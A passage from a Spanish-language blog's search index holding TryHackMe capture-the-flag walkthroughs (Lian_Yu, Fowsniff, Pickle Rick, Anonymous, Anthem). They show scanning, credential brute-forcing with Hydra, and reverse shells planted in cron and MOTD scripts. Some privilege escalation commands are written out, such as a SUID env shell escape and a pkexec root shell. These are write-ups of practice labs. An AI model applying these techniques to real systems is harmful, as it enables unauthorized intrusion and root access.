busqueda de directorios y archivos.\n1 2 3 root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 250 -x php,html,txt /index.html (Status: 200) /island (Status: 301) Encontramos una pagina donde hay una palabra clave.\nNuevamente ejecutamos GOBUSTER en este directorio nuevo.\n1 2 3 root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 100 -x php,html,txt /index.html (Status: 200) /2100 (Status: 301) En el nuevo directorio encontramos un video de YouTube incrustado en la pagina.\nEn el codigo fuente de esta pagina encontramos un comentarios que indica que podemos aprovechar nuestro .ticket.\nIntentamos ejecutar nuevamente GOBUSTER sobre este directorio para ver si encontramos algun otro directorio o pagina, pero no logramos. Por lo que agregamos ticket como una extension en gobuster. Al hacer esto encontramos una nueva pagina, en la que muestra un \u0026ldquo;token\u0026rdquo;.\n1 2 3 root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 100 -x php,html,txt,ticket /index.html (Status: 200) /green_arrow.ticket (Status: 200) Utilizamos CyberChef para poder decodificar el token, utilizamos base32.\nFTP Ahora tenemos una palabra clave y un token, utilizamos ambos como credenciales en el servicio FTP y logramos obtener acceso.\nVemos varios archivos los cuales descargamos, la mayoria, imagenes. Al analizar las imagenes nos damos cuenta de que una de ellas aun teniendo la extension PNG sus magic numbers no son los que deberian.\nUtilizamos hexeditor para editar y agregar los magic numbers de una imagen PNG.\n89 50 4E 47 0D 0A 1A 0A STEGANOGRAFIA Al realizar los cambios vemos en la imagen una contraseña. Pero ¿para qué?.\nEn las imagenes que descargamos vemos una con extension jpg, inspeccionamos esta imagen para ver si existe un archivo dentro de esta, utilizando steghide junto a la contraseña. El resultado nos muestra que hay dos archivos.\nExtraemos los archivos y vemos un mensaje en uno de estos y lo que parece ser una contraseña en el otro.\nUSER - SSH Intentamos utilizar la contraseña que encontramos en el servicio SSH con el usuario de FTP, pero no logramos obtener acceso. Regresamos nuevamente a FTP, y revisamos el directorio actual, vemos que es en el home, intentamos regresar y vemos el nombre de el otro usuario.\nUtilizamos la contraseña con este usuario y logramos obtener acceso y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando pkexec. Utilizamos pkexec para obtener una shell root.\nObtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"Lian_Yu es una maquina de TryHackMe, la enumeracion permitió obtener credenciales para FTP donde encontramos un reto de Esteganografia que nos dio acceso. finalmente obtuvimos una shell root con pkexec.","id":129,"section":"posts","tags":["ftp","xxd","hexeditor","steganography","steghide"],"title":"TryHackMe - Lian_Yu","uri":"https://sckull.github.io/posts/lianyu/"},{"content":"\rFowsniff CTF es una maquina de TryHackMe, presenta un reto OSINT donde obtuvimos credenciales que, junto con Hydra logramos obtener acceso a POP3 (Protocolo de Oficina Postal), en este ultimo encontramos contraseñas y usuarios las cuales utilzamos en Hydra para obtener acceso por SSH. Editamos un script que pertenece a pam_motd y que es ejecutado por root para escalar privilegios.\nRoom Titulo Fowsniff CTF Descripción Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners! Puntos 450 Dificultad Facil Maker ben NMAP Escaneo de puertos tcp, nmap nos muestra el puerto 80 (http), imap/pop3 (110,143) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # Nmap 7.80 scan initiated Mon Jun 22 18:36:02 2020 as: nmap -sV -o nmap_scan_mini fowsniff.thm Nmap scan report for fowsniff.thm (10.10.225.64) Host is up (0.16s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jun 22 18:36:34 2020 -- 1 IP address (1 host up) scanned in 31.57 seconds # Nmap 7.80 scan initiated Mon Jun 22 18:35:44 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan fowsniff.thm Nmap scan report for fowsniff.thm (10.10.225.64) Host is up (0.18s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA) | 256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA) |_ 256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Fowsniff Corp - Delivering Solutions 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: TOP SASL(PLAIN) UIDL USER AUTH-RESP-CODE PIPELINING CAPA RESP-CODES 143/tcp open imap Dovecot imapd |_imap-capabilities: IMAP4rev1 AUTH=PLAINA0001 SASL-IR Pre-login IDLE post-login have OK LITERAL+ more ENABLE capabilities LOGIN-REFERRALS ID listed Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jun 22 18:53:29 2020 -- 1 IP address (1 host up) scanned in 1065.82 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\nroot@upset:~/thm/fowsniff# gobuster dir -u http://fowsniff.thm/ -w /usr/share/wordlists/dirb/common.txt -q -x php,html,txt -t 25\r/assets (Status: 301)\r/images (Status: 301)\r/index.html (Status: 200)\r/index.html (Status: 200)\r/LICENSE.txt (Status: 200)\r/README.txt (Status: 200)\r/robots.txt (Status: 200)\r/robots.txt (Status: 200)\r/security.txt (Status: 200)\r/server-status (Status: 403) Security.txt Encontramos un archivo en el que indica que la pagina/empresa fue hackeada.\nTwitter Fowsniff Dentro de la pagina vemos un mensaje que indica que Fowsniff sufrio una filtracion de datos de la empresa, incluyendo la cuenta de twitter.\nEn la cuenta encontramos dos tweets con direcciones hacia pastebin.\nEn uno de estos encontramos una lista de emails y hashes md5.\nUtilizamos crackstation.net para crackear estos hashes. Logramos obtener el resultado de la mayoria de hashes.\nHYDRA/TELNET - POP3 Utilizamos hydra con los usuarios y constraseñas que encontramos. Y logramos obtener unas credenciales que podemos utilizar en este servicio.\nUtilizamos telnet con el puerto 110 para conectarnos y utilizando los comandos de POP3\nPrimer correo Encontramos en uno de los correos una contraseña temporal para conectarse en el servicio SSH.\nroot@upset:~/thm/fowsniff# telnet fowsniff.thm 110\rTrying 10.10.225.64...\rConnected to fowsniff.thm.\rEscape character is \u0026#39;^]\u0026#39;.\r+OK Welcome to the Fowsniff Corporate Mail Server!\rUSER [... spoiler ...]\r+OK\rPASS [... spoiler ...]\r+OK Logged in.\rSTAT\r+OK 2 2902\rLIST\r+OK 2 messages:\r1 1622\r2 1280\r.\rRETR 1\r+OK 1622 octets\rReturn-Path: \u0026lt;[... spoiler ...]\u0026gt;\rX-Original-To: [... spoiler ...]@fowsniff\rDelivered-To: [... spoiler ...]@fowsniff\rReceived: by fowsniff (Postfix, from userid 1000)\rid 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)\rTo: [... spoiler ...]\rSubject: URGENT! Security EVENT!\rMessage-Id: \u0026lt;20180313185107.0FA3916A@fowsniff\u0026gt;\rDate: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)\rFrom: stone@fowsniff (stone)\rDear All,\rA few days ago, a malicious actor was able to gain entry to\rour internal email systems. The attacker was able to exploit\rincorrectly filtered escape characters within our SQL database\rto access our login credentials. Both the SQL and authentication\rsystem used legacy methods that had not been updated in some time.\rWe have been instructed to perform a complete internal system\roverhaul. While the main systems are \u0026#34;in the shop,\u0026#34; we have\rmoved to this isolated, temporary server that has minimal\rfunctionality.\rThis server is capable of sending and receiving emails, but only\rlocally. That means you can only send emails to other users, not\rto the world wide web. You can, however, access this system via the SSH protocol.\rThe temporary password for SSH is \u0026#34;[... spoiler ...]\u0026#34;\rYou MUST change this password as soon as possible, and you will do so under my\rguidance. I saw the leak the attacker posted online, and I must say that your\rpasswords were not very secure.\rCome see me in my office at your earliest convenience and we\u0026#39;ll set it up.\rThanks,\rA.J Stone Segundo correo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 RETR 2 +OK 1280 octets Return-Path: \u0026lt;[... spoiler ...]\u0026gt; X-Original-To: [... spoiler ...] Delivered-To: [... spoiler ...] Received: by fowsniff (Postfix, from userid 1004) id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT) To: [... spoiler ...] Subject: You missed out! Message-Id: \u0026lt;20180313185405.101CA1AC2@fowsniff\u0026gt; Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT) From: [... spoiler ...] Devin, You should have seen the brass lay into AJ today! We are going to be talking about this one for a looooong time hahaha. Who knew the regional manager had been in the navy? She was swearing like a sailor! I don\u0026#39;t know what kind of pneumonia or something you brought back with you from your camping trip, but I think I\u0026#39;m coming down with it myself. How long have you been gone - a week? Next time you\u0026#39;re going to get sick and miss the managerial blowout of the century, at least keep it to yourself! I\u0026#39;m going to head home early and eat some chicken soup. I think I just got an email from Stone, too, but it\u0026#39;s probably just some \u0026#34;Let me explain the tone of my meeting with management\u0026#34; face-saving mail. I\u0026#39;ll read it when I get back. Feel better, Skyler PS: Make sure you change your email password. AJ had been telling us to do that right before Captain Profanity showed up. USER - BAKSTEEN Nuevamente utilizamos hydra con los usuarios y la contraseña nueva que econtramos pero esta vez en el servicio ssh.\nEncontramos la contraseña del usuario baksteen.\nIniciamos sesion en el servicio ssh y obtenemos una shell.\nPRIVILEGE ESCALATION Dentro de nuestra shell buscamos archivos que fuera interesantes que nos ayudaran a escalar privilegios, encontramos un archivo interesante en la carpeta /opt/. Al revisar este archivo encontramos que es el \u0026ldquo;banner\u0026rdquo; del servicio SSH y además el dueño del archivo es el usuario PAREDE.\nRevisamos los archivos que pertenecen al \u0026ldquo;banner\u0026rdquo; y vemos que sí se ejecuta. Pero este archivo que ejecuta el archivo en /opt/ es el usuario root.\nYa que el archivo es un script en bash, vamos a agregar una shell inversa, que al iniciar nuevamente con el usuario BAKSTEEN en el servicio SSH se ejecuta. Logramos obtener una shell con usuario root.\nAdemás vemos nuestra flag.txt en la carpeta principal de root.\n","description":"Fowsniff CTF es una maquina de TryHackMe, presenta un reto OSINT donde obtuvimos credenciales que, junto con Hydra logramos obtener acceso a POP3 (Protocolo de Oficina Postal), en este ultimo encontramos contraseñas y usuarios las cuales utilzamos en Hydra para obtener acceso por SSH. Editamos un script que pertenece a pam_motd y que es ejecutado por root para escalar privilegios.","id":130,"section":"posts","tags":["telnet","pop3","pam_motd"],"title":"TryHackMe - Fowsniff CTF","uri":"https://sckull.github.io/posts/fowsniff/"},{"content":"\rPickle Rick es una maquina de TryHackMe de tipo CTF Like presenta algunos retos y preguntas.\nRoom Titulo Pickle Rick Descripción A Rick and Morty CTF. Help turn Rick back into a human! Puntos 240 Dificultad Facil Maker tryhackme NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # Nmap 7.80 scan initiated Sun Jun 21 01:49:13 2020 as: nmap -sV -o nmap_scan_mini picklerick.thm Nmap scan report for picklerick.thm (10.10.196.129) Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 01:49:46 2020 -- 1 IP address (1 host up) scanned in 32.90 seconds # Nmap 7.80 scan initiated Sun Jun 21 01:49:14 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan picklerick.thm Nmap scan report for picklerick.thm (10.10.196.129) Host is up (0.17s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 84:2d:fc:6a:81:e4:da:21:a5:b8:8f:0f:3c:8d:74:1a (RSA) | 256 e5:aa:df:44:6c:ad:56:d0:91:d0:43:c8:a8:30:4c:2d (ECDSA) |_ 256 b9:24:ea:f6:3b:3c:ba:14:58:bb:e8:7b:6c:2c:1b:53 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Rick is sup4r cool Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 02:05:52 2020 -- 1 IP address (1 host up) scanned in 997.58 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 root@upset:~/thm/picklerick# gobuster dir -u http://picklerick.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /assets (Status: 301) /denied.php (Status: 302) /index.html (Status: 200) /login.php (Status: 200) /portal.php (Status: 302) /robots.txt (Status: 200) /server-status (Status: 403) En el codigo fuente de la pagina principal encontramos un comentario que indica un nombre de usuario.\nEn el archivo robots.txt encontramos una frase.\nEn la pagina login.php encontramos un panel de inicio de sesion.\nUtilizamos el usuario que encontramos con la frase en robots.txt y logramos obtener acceso al portal de la pagina.\nIngredientes En el portal encontramos un input en el que podemos ejecutar comandos.\nListamos los comandos pero no podemos utilizar cat al parecer esta bloqueado, pero podemos utilizar less para leer los archivos por lo que podemos leer los archivos del sistema y de la pagina, y vemos los comandos que no estan permitidos.\nPrimer Ingrediente Encontramos el Primer Ingrediente en el directorio actual.\nSegundo Ingrediente El Segundo Ingrediente lo encontramos en el directorio principal de rick, pero el dueño del archivo es el usuario root.\nHacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar cualquier comando sin contraseña.\nCon sudo less podemos leer el Segundo Ingrediente.\nTercer Ingrediente En el directorio principal del usuario root encontramos el Tercer Ingrediente.\nTercer Ingrediente.\n","description":"Pickle Rick es una maquina de TryHackMe de tipo CTF Like presenta algunos retos y preguntas.","id":131,"section":"posts","tags":[],"title":"TryHackMe - Pickle Rick","uri":"https://sckull.github.io/posts/picklerick/"},{"content":"\rAnonymous es una maquina de TryHackMe, dentro del servicio FTP encontramos un script que realiza una \u0026ldquo;limpieza\u0026rdquo;, supusimos que este era ejecutado por algun cron por lo que reemplazamos su contenido con una shell inversa para obtener acceso. Utilizando el comando env con permisos SUID obtuvimos acceso como root.\nRoom Titulo Anonymous Descripción Not the hacking group Puntos 480 Dificultad Media Maker Nameless0ne NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), smb (445, 139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 # Nmap 7.80 scan initiated Sat Jun 20 23:42:51 2020 as: nmap -sV -o nmap_scan_mini anonymous.thm Nmap scan report for anonymous.thm (10.10.243.66) Host is up (0.15s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 23:43:24 2020 -- 1 IP address (1 host up) scanned in 32.72 seconds # Nmap 7.80 scan initiated Sat Jun 20 23:52:25 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anonymous.thm Nmap scan report for anonymous.thm (10.10.243.66) Host is up (0.16s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 111 113 4096 Jun 21 04:41 scripts [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.6.160 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA) | 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA) |_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: anonymous | NetBIOS computer name: ANONYMOUS\\x00 | Domain name: \\x00 | FQDN: anonymous |_ System time: 2020-06-21T05:05:33+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-21T05:05:33 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 00:05:40 2020 -- 1 IP address (1 host up) scanned in 795.29 seconds FTP Mediante el servicio ftp en el puerto 21 ingresamos como anonymous (anonymous:anonymous) y pudimos listar los archivos y carpetas de la maquina, además descargarlos.\nEn el archivo clean.sh encontramos un script en bash el cual elimina los archivos que se encuentran en la carpeta /tmp/.\nEl segundo archivoremoved_files.log que tiene el log de archivos que se han eliminado por el script clean.sh.\nPor ultimo está el archivo to_do.txt, muestra un mensaje que seguramente algun usuario escribió.\nSMB Utilizamos smbclient para obtener informacion del servicio SAMBA en donde encontramos algunos SHARENAMES.\nEn el SHARENAME pics es el unico en donde logramos entrar sin credenciales, en donde encontramos dos imagenes.\nEn el servicio SAMBA no logramos hacer nada, ya que solo tenemos el permiso de LISTAR\nFTP - USER Volvimos nuevamente al servicio FTP. Dentro de este servicio tenemos permisos para subir archivos, logramos subir un archivo de prueba.\nEn la carpeta a la que tenemos acceso hay un script (clean.sh) descrito anteriormente, intentamos reemplazar este archivo, en el que pusimos un pequeño comando de ping (ping -c 5 10.10.10.10) hacia nuestra IP. Hacemos esto ya que consideramos que alguien debe de ejecutar el script para poder limpiar la carpeta /tmp/, además que el archivo de log (removed_files.log) del script, cada vez tiene más lineas.\nSubimos el archivo y con tcpdump capturamos el trafico de ping (icmp).\nLogramos obtener respuesta desde la maquina hacia la nuestra, por lo que sabemos que el script es ejecutado, probablemente por un cronjob.\nVolvemos a sobreescribir el archivo clean.sh pero esta vez con una shell inversa. Ponemos a la escucha nuestra maquina (nc -lvp 1338).\nLogramos obtener una shell y nuestra flag user.txt.\nAdemás, podemos ver el cronjob que se ejecuta en la maquina.\nPRIVILEGE ESCALATION Hacemos una enumeracion de binarios SUID con find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah y vemos que existe env en la maquina. Utilizamos env para obtener una shell root.\nEjecutamos /usr/bin/env /bin/sh -p, obtenemos una shell como usuario root y nuestra flag root.txt.\n","description":"Anonymous es una maquina de TryHackMe, dentro del servicio FTP encontramos un script que realiza una \"limpieza\", supusimos que este era ejecutado por algun cron por lo que reemplazamos su contenido con una shell inversa para obtener acceso. Utilizando el comando env con permisos SUID obtuvimos acceso como root.","id":132,"section":"posts","tags":["ftp","smbclient","suid"],"title":"TryHackMe - Anonymous","uri":"https://sckull.github.io/posts/anonymous/"},{"content":"\rAnthem es una maquina de TryHackMe, presenta el CMS Umbranco, encontramos unos posts que nos permitieron encontrar credenciales, mismas que utilizamos en RDP. Un archivo oculto al cual le dimos permisos contenia una frase que utilizamos para obtener acceso privilegiado.\nRoom Titulo Anthem Descripción Exploit a Windows machine in this beginner level challenge. Puntos 970 Dificultad Facil Maker Chevalier NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto rdp (3389) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 # Nmap 7.80 scan initiated Sat Jun 20 18:56:03 2020 as: nmap -sV -o nmap_scan_mini anthem.thm Nmap scan report for anthem.thm (10.10.109.143) Host is up (0.19s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 18:58:39 2020 -- 1 IP address (1 host up) scanned in 156.11 seconds # Nmap 7.80 scan initiated Sat Jun 20 20:27:23 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anthem.thm Warning: 10.10.194.228 giving up on port because retransmission cap hit (6). Nmap scan report for anthem.thm (10.10.194.228) Host is up (0.18s latency). Not shown: 65520 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-robots.txt: 4 disallowed entries |_/bin/ /config/ /umbraco/ /umbraco_client/ |_http-title: Anthem.com - Welcome to our blog 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WIN-LU09299160F | NetBIOS_Domain_Name: WIN-LU09299160F | NetBIOS_Computer_Name: WIN-LU09299160F | DNS_Domain_Name: WIN-LU09299160F | DNS_Computer_Name: WIN-LU09299160F | Product_Version: 10.0.17763 |_ System_Time: 2020-06-21T01:45:48+00:00 | ssl-cert: Subject: commonName=WIN-LU09299160F | Not valid before: 2020-04-04T22:56:38 |_Not valid after: 2020-10-04T22:56:38 |_ssl-date: 2020-06-21T01:45:58+00:00; 0s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 20106/tcp filtered unknown 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-21T01:45:49 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 20:45:59 2020 -- 1 IP address (1 host up) scanned in 1116.48 seconds HTTP Pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@upset:~/thm/anthem# gobuster dir -u http://anthem.thm -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /Archive (Status: 301) /archive (Status: 301) /authors (Status: 200) /Blog (Status: 200) /blog (Status: 200) /categories (Status: 200) /install (Status: 302) /robots.txt (Status: 200) /robots.txt (Status: 200) /rss (Status: 200) /RSS (Status: 200) /search (Status: 200) /Search (Status: 200) /sitemap (Status: 200) /SiteMap (Status: 200) /tags (Status: 200) /umbraco (Status: 200) Encontramos en el archivo robots.txt direcciones que no aparecen en GOBUSTER, además encontramos una frase que posiblemente sea util.\nVisitamos /umbranco y encontramos un panel de inicio de sesion, pero aun no tenemos credenciales.\nEn uno de los Posts de la pagina, encontramos un correo, que nos podria servir para encontrar otros.\nIntentamos utilizar el correo junto a la frase que encontramos pero no funcionó en /umbranco. En una de las pistas del CTF nos dice que utilicemos nuestro buscador favorito, pero ¿qué vamos a buscar?.\nDentro de uno de los posts encontramos un poema, al buscar este poema en internet encontramos un nombre del que parece ser el autor de este.\nAutor\nUNBRANCO Con esto, logramos encontrar el nombre del administrador y el correo (con el patron Jose Lopez -\u0026gt; JL@dominio.com). Intentamos utilizar el correo con la frase encontrada en /umbranco y logramos obtener acceso.\nLa version de Umbraco es 7.15.4 por lo que no encontramos un exploit que pudiera ayudarnos a tener acceso en la maquina.\nRDP - USER Intentamos mediante el servicio RDP con las credenciales y logramos acceder mediante este.\nInstalacion de Remmina:\n1 apt install remmina Logramos obtener una sesion y la flag user.txt.\nADMINISTRATOR - USER Teniendo una sesion en la maquina buscamos informacion que pudiera ayudarnos a escalar privilegios, no encontramos binarios, archivos o servicios en los cuales apoyarnos. Pero, al revisar las carpetas nos damos cuenta que no esta activada la opcion de que permite ver archivos ocultos. La activamos y encontramos un archivo en el directorio principal del disco.\nAl intentar abrir el archivo nos muestra un mensaje de que no tenemos permisos.\nVemos las propiedades del archivo y vemos que no tiene ningun grupo o usuario permitido escribir, leer o modificar. Agregamos nuestro usuario al archivo. Escribimos el nombre de nuestro usuario y damos Check Names y automaticamente lo agrega con el nombre del equipo.\nAplicamos y vemos que nuestro usuario tiene todos los permisos permitidos.\nAbrimos el archivo, logramos leer el archivo y vemos una frase dentro.\nAgregamos una nueva conexion al servicio RDP pero con el usuario administrator y con la frase que encontramos.\nLogramos obtener una sesion y nuestra flag root.txt.\nFLAGS EXTRA FLAG 1 La encontramos en el primer post.\nFLAG 2 La flag la encontramos en el codigo fuente de la pagina.\nFLAG 3 La encontramos en el perfil de Jane Doe.\nFLAG 4 Encontramos la flag en el segundo post.\n","description":"Anthem es una maquina de TryHackMe, presenta el CMS Umbranco, encontramos unos posts que nos permitieron encontrar credenciales, mismas que utilizamos en RDP. Un archivo oculto al cual le dimos permisos contenia una frase que utilizamos para obtener acceso privilegiado.","id":133,"section":"posts","tags":["rdp","umbranco"],"title":"TryHackMe - Anthem","uri":"https://sckull.github.io/posts/anthem/"},{"content":"\rMonteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.\nInformacion de la Maquina Nombre Monteverde OS Windows Puntos 30 Dificultad Media IP 10.10.10.172 Maker egre55\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.9, 8.1, 6.7, 3.3, 1.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 9, 7, 3, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 